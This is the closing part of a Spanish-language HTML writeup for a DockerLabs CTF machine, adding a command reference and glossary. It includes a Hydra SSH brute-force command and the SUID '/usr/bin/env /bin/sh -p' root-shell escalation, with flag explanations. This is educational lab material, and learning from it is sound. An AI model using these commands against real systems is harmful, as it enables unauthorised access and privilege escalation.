+        <div style="font-family: var(--font-mono); font-size: 0.75rem; color: var(--text-dim); margin-top: 0.8rem; letter-spacing: 2px;">MÁQUINA OBSESSION — DOCKERLABS — COMPLETADA</div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- REFERENCIA -->
+    <div class="section" id="referencia">
+      <p class="section-label">// 10</p>
+      <h2 class="section-title">Referencia de Comandos</h2>
+      <div class="section-line"></div>
+      <div class="prose">
+        <p>Descripción detallada de cada herramienta y comando utilizado en este writeup.</p>
+      </div>
+
+      <div class="cmd-ref-grid">
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">Nmap</div>
+          <div class="cmd-ref-syntax">nmap -p- -sSCV -n -Pn --min-rate=5000 --open -oX &lt;IP&gt;</div>
+          <p class="cmd-ref-desc">Escáner de redes y puertos. Detecta servicios abiertos, versiones de software y scripts NSE. Con <code>-oX</code> exporta el resultado en XML para post-procesamiento.</p>
+          <ul class="cmd-ref-flags">
+            <li><span>-p-</span> → escanea los 65535 puertos TCP</li>
+            <li><span>-sS</span> → SYN scan, no completa el handshake TCP</li>
+            <li><span>-sC</span> → ejecuta scripts NSE por defecto (ftp-anon, http-title, etc.)</li>
+            <li><span>-sV</span> → detecta versión de servicios</li>
+            <li><span>-n</span> → sin resolución DNS (más rápido)</li>
+            <li><span>-Pn</span> → skip host discovery, trata el host como activo</li>
+            <li><span>--min-rate=5000</span> → mínimo 5000 paquetes/segundo</li>
+            <li><span>--open</span> → muestra solo puertos abiertos</li>
+            <li><span>-oX archivo.xml</span> → exporta resultado en formato XML</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">xsltproc</div>
+          <div class="cmd-ref-syntax">xsltproc /usr/share/nmap/nmap.xsl scan.xml &gt; reporte.html</div>
+          <p class="cmd-ref-desc">Procesador XSLT de línea de comandos. Aplica una hoja de estilos XSL a un archivo XML para transformarlo en otro formato. Se usa para convertir el XML de Nmap en un reporte HTML navegable y visualmente organizado.</p>
+          <ul class="cmd-ref-flags">
+            <li><span>nmap.xsl</span> → hoja de estilos oficial de Nmap (incluida en Kali)</li>
+            <li><span>scan.xml</span> → archivo XML generado por Nmap con -oX</li>
+            <li><span>&gt; reporte.html</span> → redirige la salida a un archivo HTML</li>
+            <li><span>xdg-open reporte.html</span> → abre el HTML en el navegador de Kali</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">FTP (cliente)</div>
+          <div class="cmd-ref-syntax">ftp &lt;IP&gt; → login anonymous</div>
+          <p class="cmd-ref-desc">Cliente FTP de línea de comandos para transferencia de archivos. Cuando el servidor tiene el acceso anónimo habilitado, se puede conectar con el usuario <code>anonymous</code> sin contraseña real. Permite listar y descargar archivos del servidor.</p>
+          <ul class="cmd-ref-flags">
+            <li><span>anonymous / ftp</span> → usuarios para acceso anónimo</li>
+            <li><span>ls</span> → lista archivos del directorio actual</li>
+            <li><span>get archivo</span> → descarga un archivo al directorio local</li>
+            <li><span>mget *</span> → descarga todos los archivos del directorio</li>
+            <li><span>bye / quit</span> → cierra la conexión FTP</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">wfuzz</div>
+          <div class="cmd-ref-syntax">wfuzz -c --hc=404 -t 200 -w wordlist URL/FUZZ</div>
+          <p class="cmd-ref-desc">Herramienta de fuzzing web. Reemplaza la palabra clave FUZZ en la URL con cada línea del diccionario y analiza las respuestas HTTP. Permite descubrir directorios, archivos y parámetros ocultos en servidores web.</p>
+          <ul class="cmd-ref-flags">
+            <li><span>-c</span> → salida con colores para mejor legibilidad</li>
+            <li><span>--hc=404</span> → oculta respuestas con código 404 (Not Found)</li>
+            <li><span>--hc=301,302</span> → también puede ocultar redirects</li>
+            <li><span>-t 200</span> → 200 hilos/tareas en paralelo</li>
+            <li><span>-w wordlist</span> → ruta al diccionario de palabras</li>
+            <li><span>FUZZ</span> → marcador que wfuzz reemplaza con cada palabra</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">Hydra</div>
+          <div class="cmd-ref-syntax">hydra -l user -P wordlist -f ssh://IP -t N -V</div>
+          <p class="cmd-ref-desc">Herramienta de fuerza bruta de red multi-protocolo. Soporta SSH, FTP, HTTP, SMB, RDP y decenas más. Realiza ataques de diccionario (wordlist) probando combinaciones de usuario/contraseña a alta velocidad con múltiples hilos paralelos.</p>
+          <ul class="cmd-ref-flags">
+            <li><span>-l usuario</span> → username fijo (minúscula l = login único)</li>
+            <li><span>-L lista</span> → lista de usernames (mayúscula L)</li>
+            <li><span>-p pass</span> → contraseña fija</li>
+            <li><span>-P wordlist</span> → diccionario de contraseñas (mayúscula P)</li>
+            <li><span>-f</span> → detener al encontrar la primera credencial válida</li>
+            <li><span>ssh://IP</span> → protocolo y objetivo</li>
+            <li><span>-t 20</span> → número de tareas paralelas (threads)</li>
+            <li><span>-V</span> → verbose, muestra cada intento</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">ssh-keygen -R</div>
+          <div class="cmd-ref-syntax">ssh-keygen -R &lt;IP o hostname&gt;</div>
+          <p class="cmd-ref-desc">Elimina todas las entradas de un host específico del archivo <code>~/.ssh/known_hosts</code>. Necesario cuando la clave SSH del servidor cambia (contenedor Docker nuevo, reinstalación del SO) y el cliente SSH bloquea la conexión por seguridad.</p>
+          <ul class="cmd-ref-flags">
+            <li><span>-R IP</span> → elimina entradas de esa IP en known_hosts</li>
+            <li><span>known_hosts</span> → archivo que guarda fingerprints de servidores SSH conocidos</li>
+            <li><span>-f ruta</span> → especificar un known_hosts alternativo</li>
+            <li><span>Alternativa manual</span> → editar ~/.ssh/known_hosts y borrar la línea</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">find (SUID)</div>
+          <div class="cmd-ref-syntax">find / -perm -4000 2>/dev/null</div>
+          <p class="cmd-ref-desc">Busca en todo el sistema de archivos binarios con el bit SUID activo (permisos 4000). Los binarios SUID se ejecutan con los privilegios de su propietario, frecuentemente root, lo que puede ser abusado para escalar privilegios.</p>
+          <ul class="cmd-ref-flags">
+            <li><span>/</span> → busca desde la raíz (recursivo)</li>
+            <li><span>-perm -4000</span> → bit SUID activo (el guión = "al menos estos bits")</li>
+            <li><span>2&gt;/dev/null</span> → descarta errores "permission denied"</span></li>
+            <li><span>-perm /4000</span> → variante alternativa (misma función)</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">/usr/bin/env (SUID)</div>
+          <div class="cmd-ref-syntax">/usr/bin/env /bin/sh -p</div>
+          <p class="cmd-ref-desc"><strong>env</strong> ejecuta programas en un entorno modificado. Con SUID activo y propietario root, puede spawnear una shell heredando eUID=0. La flag <code>-p</code> de <code>/bin/sh</code> impide que la shell descarte el privilegio efectivo heredado.</p>
+          <ul class="cmd-ref-flags">
+            <li><span>SUID + root owner</span> → hereda eUID=0 al ejecutar</li>
+            <li><span>/bin/sh -p</span> → shell que preserva el eUID (effective UID)</li>
+            <li><span>-p flag</span> → "privileged mode": no resetea eUID al rUID del invocador</li>
+            <li><span>GTFOBins</span> → gtfobins.github.io/gtfobins/env/</li>
+          </ul>
+        </div>
+
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- GLOSARIO -->
+    <div class="section" id="glosario">
+      <p class="section-label">// 11</p>
+      <h2 class="section-title">Glosario</h2>
+      <div class="section-line"></div>
+      <div class="prose">
+        <p>Conceptos clave utilizados en este writeup, explicados en contexto de ciberseguridad ofensiva.</p>
+      </div>
+
+      <div class="glosario-grid">
+
+        <div class="glos-card">
+          <div class="glos-term">FTP Anónimo (Anonymous FTP)</div>
+          <div class="glos-def">El protocolo <strong>FTP (File Transfer Protocol)</strong> permite acceso sin credenciales reales cuando el servidor tiene habilitado el login anónimo. El usuario se conecta con el nombre <code>anonymous</code> y cualquier contraseña (por convención, un email). Es una <strong>misconfiguración clásica</strong> que expone archivos del servidor a cualquier persona en la red. vsftpd lo tiene deshabilitado por defecto; habilitarlo en producción sin restricciones es una vulnerabilidad de configuración.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">TTL (Time To Live)</div>
+          <div class="glos-def">Campo de los paquetes IP que indica cuántos "saltos" (routers) puede atravesar el paquete antes de ser descartado. Cada router decrementa el TTL en 1. En ciberseguridad, el valor inicial del TTL en la respuesta ping revela el sistema operativo del objetivo: <strong>TTL=64 → Linux/Unix</strong>, <strong>TTL=128 → Windows</strong>, <strong>TTL=255 → dispositivos de red Cisco</strong>. Es una técnica de OS fingerprinting pasivo que no requiere herramientas especiales.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Fuzzing Web (Directory Fuzzing)</div>
+          <div class="glos-def">Técnica que consiste en probar automáticamente miles de nombres de directorios y archivos en un servidor web para descubrir recursos no enlazados públicamente. Herramientas como <strong>wfuzz</strong>, <strong>gobuster</strong> o <strong>ffuf</strong> reemplazan un marcador en la URL con palabras de un diccionario y analizan el código de respuesta HTTP: 200 (existe), 301/302 (redirect), 403 (existe pero prohibido), 404 (no existe). Es fundamental en la fase de enumeración web de cualquier pentest.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Directory Listing</div>
+          <div class="glos-def">Vulnerabilidad de configuración web donde el servidor muestra el contenido de un directorio cuando no existe un archivo índice (index.html, index.php) y la opción <code>Options Indexes</code> está activa en Apache. Expone la estructura de archivos del servidor al visitante. Puede revelar backups, archivos de configuración, scripts no publicados o datos sensibles. Se mitiga deshabilitando la opción con <code>Options -Indexes</code> en la configuración de Apache.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Ataque de Fuerza Bruta / Diccionario</div>
+          <div class="glos-def">Un <strong>ataque de fuerza bruta pura</strong> prueba todas las combinaciones posibles de caracteres. Un <strong>ataque de diccionario</strong> (más eficiente) prueba palabras reales de una lista precompilada. <strong>rockyou.txt</strong> (14.3M contraseñas filtradas de la brecha RockYou 2009) es el estándar en CTFs porque refleja contraseñas reales usadas por personas reales. Herramientas como <strong>Hydra</strong>, <strong>Medusa</strong> o <strong>Burp Intruder</strong> automatizan estos ataques contra servicios de red (SSH, FTP, HTTP, etc.).</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">SUID (Set User ID)</div>
+          <div class="glos-def">Bit de permiso especial en sistemas Unix/Linux. Cuando un archivo ejecutable tiene el bit SUID activo (<code>chmod u+s</code> o <code>chmod 4755</code>), se ejecuta con los privilegios del <strong>propietario del archivo</strong>, no del usuario que lo invoca. Si el propietario es root, el proceso obtiene <strong>eUID=0</strong> (root efectivo). Herramientas como <strong>GTFOBins</strong> documentan cómo explotar binarios legítimos con SUID para escalar privilegios. La búsqueda estándar es <code>find / -perm -4000 2&gt;/dev/null</code>.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">eUID vs rUID (Effective vs Real User ID)</div>
+          <div class="glos-def">En Linux, cada proceso tiene dos identidades de usuario. El <strong>rUID (Real User ID)</strong> es el usuario que realmente ejecutó el proceso. El <strong>eUID (Effective User ID)</strong> es el que determina los permisos de acceso durante la ejecución. En condiciones normales son iguales. Con SUID, el eUID se convierte en el del propietario del binario. La flag <code>-p</code> de <code>/bin/sh</code> activa el "modo privilegiado", impidiendo que la shell resetee el eUID al rUID, preservando así los privilegios root heredados del binario SUID.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">GTFOBins</div>
+          <div class="glos-def"><strong>GTFOBins</strong> (gtfobins.github.io) es un proyecto de referencia que cataloga binarios Unix/Linux que pueden ser usados por atacantes para escapar de entornos restringidos, escalar privilegios, transferir archivos o ejecutar código arbitrario. Documenta el abuso de binarios legítimos del sistema (como <code>env</code>, <code>vim</code>, <code>python</code>, <code>find</code>, <code>bash</code>) cuando tienen permisos especiales (SUID, sudo, capabilities). Es una referencia indispensable en la fase de post-explotación y escalada de privilegios.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">SSH — known_hosts y Host Key Verification</div>
+          <div class="glos-def">SSH protege contra ataques Man-in-the-Middle almacenando la huella digital (fingerprint) de la clave pública de cada servidor al que te conectas por primera vez, en el archivo <code>~/.ssh/known_hosts</code>. En conexiones posteriores, verifica que la clave del servidor coincide. Si no coincide (servidor reinstalado, nuevo contenedor Docker con misma IP, ataque MitM real), SSH bloquea la conexión. El comando <code>ssh-keygen -R IP</code> elimina la entrada antigua para permitir reconectar con la nueva clave.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">OSINT (Open Source Intelligence)</div>
+          <div class="glos-def"><strong>OSINT</strong> es la recolección de información de fuentes públicas o accesibles sin autenticación para apoyar un ataque o investigación. En este writeup, el nombre de usuario <strong>russoski</strong> se obtuvo por OSINT pasivo: del título HTTP detectado por Nmap (<em>"Russoski Coaching"</em>), del email en el footer del sitio (<em>russoski@dockerlabs.es</em>), y finalmente confirmado en el archivo <em>backup.txt</em>. La fase de OSINT/reconocimiento es crítica porque reduce el espacio de búsqueda para ataques subsecuentes.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Post-Explotación</div>
+          <div class="glos-def">Fase posterior a obtener acceso inicial a un sistema comprometido. Incluye: <strong>enumeración del sistema</strong> (usuarios, grupos, servicios corriendo), <strong>búsqueda de credenciales</strong> (archivos de configuración, historiales de bash, bases de datos locales), <strong>escalada de privilegios</strong> (de usuario estándar a root), <strong>movimiento lateral</strong> (hacia otros sistemas en la red), y <strong>persistencia</strong> (backdoors, cron jobs maliciosos). En CTFs, la post-explotación generalmente termina al obtener root y leer la flag.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">vsftpd (Very Secure FTP Daemon)</div>
+          <div class="glos-def"><strong>vsftpd</strong> es uno de los servidores FTP más utilizados en sistemas Linux, especialmente Ubuntu. Se caracteriza por su enfoque en seguridad: por defecto tiene el acceso anónimo deshabilitado, chroot de usuarios (confinamiento al directorio home), y soporte para SSL/TLS. La versión 3.0.5 (usada en esta máquina) es estable y segura en su configuración por defecto — la vulnerabilidad aquí fue una decisión de configuración (habilitar anonymous login) y no un fallo del software.</div>
+        </div>
+
+      </div>
+    </div>
+
+  </main>
+</div>
+
+<!-- FOOTER -->
+<footer>
+  <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup personal · DockerLabs</p>
+  <p>Built with <span>kali linux</span> &amp; <span>❤</span></p>
+</footer>
+
+<script>
+  // ACTIVE TOC
+  const sections = document.querySelectorAll('.section[id]');
+  const tocLinks = document.querySelectorAll('.toc-list a');
+  const tocObserver = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const active = document.querySelector(`.toc-list a[href="#${e.target.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-30% 0px -60% 0px' });
+  sections.forEach(s => tocObserver.observe(s));
+
+  // CURSOR
+  const cursor = document.getElementById('cursor');
+  const ring   = document.getElementById('cursorRing');
+  document.addEventListener('mousemove', e => {
+    cursor.style.left = e.clientX + 'px'; cursor.style.top = e.clientY + 'px';
+    ring.style.left   = e.clientX + 'px'; ring.style.top   = e.clientY + 'px';
+    cursor.style.opacity = '1'; ring.style.opacity = '0.5';
+  });
+  document.addEventListener('mousedown', () => { cursor.style.transform = 'translate(-50%,-50%) scale(0.5)'; });
+  document.addEventListener('mouseup',   () => { cursor.style.transform = 'translate(-50%,-50%)'; });
+  document.querySelectorAll('a, button').forEach(el => {
+    el.addEventListener('mouseenter', () => { ring.style.width = '54px'; ring.style.height = '54px'; ring.style.opacity = '0.3'; });
+    el.addEventListener('mouseleave', () => { ring.style.width = '36px'; ring.style.height = '36px'; ring.style.opacity = '0.5'; });
+  });
+
+  // SCROLL REVEAL
+  const obs = new IntersectionObserver(entries => {
+    entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+  }, { threshold: 0.06 });
+  document.querySelectorAll('.section').forEach(s => obs.observe(s));
+
+  // PROGRESS BAR
+  window.addEventListener('scroll', () => {
+    const winScroll = document.documentElement.scrollTop;
+    const height = document.documentElement.scrollHeight - window.innerHeight;
+    const scrolled = height > 0 ? (winScroll / height) * 100 : 0;
+    const bar = document.getElementById('readingProgress');
+    if (bar) bar.style.width = scrolled + '%';
+  });
+
+  // TOAST
+  function showToast(msg) {
+    let toast = document.querySelector('.toast');
+    if (!toast) {
+      toast = document.createElement('div');
+      toast.className = 'toast';
+      document.body.appendChild(toast);
+    }
+    toast.textContent = '📋 ' + msg;
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 2000);
+  }
+
+  // COPY COMMAND
+  function copyCmd(btn) {
+    const block = btn.closest('.cmd-block');
+    const cmd = block.dataset.cmd || '';
+    navigator.clipboard.writeText(cmd).then(() => {
+      btn.textContent = '✓ OK';
+      btn.classList.add('copied');
+      showToast('Comando copiado ✓');
+      setTimeout(() => {
+        btn.textContent = 'COPY';
+        btn.classList.remove('copied');
+      }, 1800);
+    }).catch(() => {
+      showToast('Error al copiar');
+    });
+  }
+</script>
+</body>
+</html>
